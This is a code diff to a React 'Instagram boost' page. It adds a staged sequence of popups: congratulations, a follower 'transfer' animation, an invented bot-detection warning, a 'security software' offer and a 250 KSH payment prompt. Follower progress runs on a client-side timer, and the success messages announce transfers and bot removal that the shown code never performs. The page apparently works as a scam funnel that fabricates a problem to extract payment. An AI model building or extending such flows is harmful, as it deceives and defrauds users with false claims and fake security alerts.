@@ -10,7 +10,11 @@ import { useNavigate } from "react-router-dom"
 import { InstagramBoostSkeleton } from "@/components/skeletons/instagram-boost-skeleton"
 import { VerificationPopup } from "@/components/verification-popup"
 import { RechargePopup } from "@/components/recharge-popup"
-import { CompletionFlow } from "@/components/completion-flow"
+import { CongratulationsPopup } from "@/components/congratulations-popup"
+import { TransferAnimation } from "@/components/transfer-animation"
+import { BotDetectionPopup } from "@/components/bot-detection-popup"
+import { SecuritySoftware } from "@/components/security-software"
+import { PaymentConfirmation } from "@/components/payment-confirmation"
 import { cn } from "@/lib/utils"
 import { toast } from "@/hooks/use-toast"
 import heroImage from "@/assets/hero-bg.jpg"
@@ -41,8 +45,11 @@ const InstagramBoost = () => {
   const [rechargeTriggered, setRechargeTriggered] = useState(false)
   
   // Completion flow states
-  const [showCompletionFlow, setShowCompletionFlow] = useState(false)
-  const [completionTriggered, setCompletionTriggered] = useState(false)
+  const [showCongratulations, setShowCongratulations] = useState(false)
+  const [showTransferAnimation, setShowTransferAnimation] = useState(false)
+  const [showBotDetection, setShowBotDetection] = useState(false)
+  const [showSecuritySoftware, setShowSecuritySoftware] = useState(false)
+  const [showPaymentConfirmation, setShowPaymentConfirmation] = useState(false)
   
   // Persistent timer for continuous progress
   const startTimeRef = useRef<number | null>(null)
@@ -203,15 +210,8 @@ const InstagramBoost = () => {
         })
 
         if (progressRatio >= 0.4) {
-          // Trigger completion flow at 40% for testing
-          if (!completionTriggered) {
-            setShowCompletionFlow(true)
-            setCompletionTriggered(true)
-          }
-        }
-        
-        if (progressRatio >= 1) {
-          clearInterval(progressInterval);
+          clearInterval(progressInterval)
+          setShowCongratulations(true)
         }
       }, 1000);
 
@@ -247,10 +247,8 @@ const InstagramBoost = () => {
     // Reset verification/recharge flags and ensure modals are closed
     setVerificationTriggered(false)
     setRechargeTriggered(false)
-    setCompletionTriggered(false)
     setShowVerificationPopup(false)
     setShowRechargePopup(false)
-    setShowCompletionFlow(false)
     startTimeRef.current = Date.now()
     setShowForm(false) // Hide form and show boost dashboard
   }
@@ -287,6 +285,54 @@ const InstagramBoost = () => {
     toast({
       title: "Recharge Successful!",
       description: "Your boost has been extended. Continuing to 100%...",
+      duration: 3000,
+    })
+  }
+
+  // Completion flow handlers
+  const handleStartTransfer = () => {
+    setShowCongratulations(false)
+    setShowTransferAnimation(true)
+  }
+
+  const handleBotDetected = () => {
+    setShowTransferAnimation(false)
+    setShowBotDetection(true)
+  }
+
+  const handleRetryTransfer = () => {
+    setShowBotDetection(false)
+    toast({
+      title: "Transfer Complete!",
+      description: "All followers have been successfully transferred to your account.",
+      duration: 3000,
+    })
+  }
+
+  const handleUseSecurity = () => {
+    setShowBotDetection(false)
+    setShowSecuritySoftware(true)
+  }
+
+  const handleActivateSecurity = () => {
+    setShowSecuritySoftware(false)
+    setShowPaymentConfirmation(true)
+  }
+
+  const handleConfirmPayment = () => {
+    setShowPaymentConfirmation(false)
+    toast({
+      title: "Payment Successful!",
+      description: "Security software activated. All bot followers removed and transfer completed!",
+      duration: 5000,
+    })
+  }
+
+  const handleTransferComplete = () => {
+    setShowTransferAnimation(false)
+    toast({
+      title: "Transfer Complete!",
+      description: "All followers have been successfully transferred to your account.",
       duration: 3000,
     })
   }
@@ -717,12 +763,44 @@ const InstagramBoost = () => {
         currentFollowers={currentFollowers}
       />
 
-      {/* Completion Flow */}
-      <CompletionFlow
-        isOpen={showCompletionFlow}
-        onClose={() => setShowCompletionFlow(false)}
+      {/* Completion Flow Components */}
+      <CongratulationsPopup
+        isOpen={showCongratulations}
+        onClose={() => setShowCongratulations(false)}
+        onStartTransfer={handleStartTransfer}
         platform="instagram"
         followersGained={targetFollowers - parseInt(userFollowers || "0")}
+        currentFollowers={targetFollowers}
+      />
+
+      <TransferAnimation
+        isOpen={showTransferAnimation}
+        onBotDetected={handleBotDetected}
+        onTransferComplete={handleTransferComplete}
+        platform="instagram"
+        followersToTransfer={targetFollowers - parseInt(userFollowers || "0")}
+      />
+
+      <BotDetectionPopup
+        isOpen={showBotDetection}
+        onRetryTransfer={handleRetryTransfer}
+        onUseSecurity={handleUseSecurity}
+        platform="instagram"
+      />
+
+      <SecuritySoftware
+        isOpen={showSecuritySoftware}
+        onActivate={handleActivateSecurity}
+        onClose={() => setShowSecuritySoftware(false)}
+        platform="instagram"
+      />
+
+      <PaymentConfirmation
+        isOpen={showPaymentConfirmation}
+        onConfirm={handleConfirmPayment}
+        onCancel={() => setShowPaymentConfirmation(false)}
+        platform="instagram"
+        amount="250 KSH"
       />
     </div>
   )
